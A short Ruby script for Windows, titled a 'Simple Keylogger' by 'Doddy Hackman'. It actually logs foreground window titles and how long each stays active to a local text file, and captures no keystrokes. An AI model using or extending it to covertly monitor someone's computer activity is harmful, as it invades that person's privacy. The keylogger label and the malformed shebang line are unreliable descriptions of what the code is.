#!usr/bin/ruby
#Simple Keylogger in Ruby
#(C) Doddy Hackman 2011

require 'Win32API'
require 'date'

def savefile(filename,text)
files = File.open(filename,'a')
files.puts text+"\n"
files.close
end

def capturar

	require 'Win32API'
	
	getForegroundWindow = Win32API.new('user32', 'GetForegroundWindow', [], 'L')
	getWindowText = Win32API.new('user32', 'GetWindowText', ['L', 'P', 'I'], 'I')

	window_handle = getForegroundWindow.Call()
		
	title_buffer1 = ' ' * 256
	getWindowText.Call(window_handle, title_buffer1, 256)
	initTime = Time.now

	while 1
		getForegroundWindow = Win32API.new('user32', 'GetForegroundWindow', [], 'L')
		getWindowText = Win32API.new('user32', 'GetWindowText', ['L', 'P', 'I'], 'I')

		window_handle = getForegroundWindow.Call()
		
		
		title_buffer2 = ' ' * 256
		getWindowText.Call(window_handle, title_buffer2, 256)
		
		
		if (title_buffer1 != title_buffer2)
			timeElapsed = Time.now - initTime 			
			savefile('activeWindows.txt',"#{DateTime.now},#{timeElapsed},#{title_buffer1}")
			puts timeElapsed
			title_buffer1 = title_buffer2
			initTime = Time.now
		end
	end
	
end

capturar() #Start the keylogger

# ¿ The End ?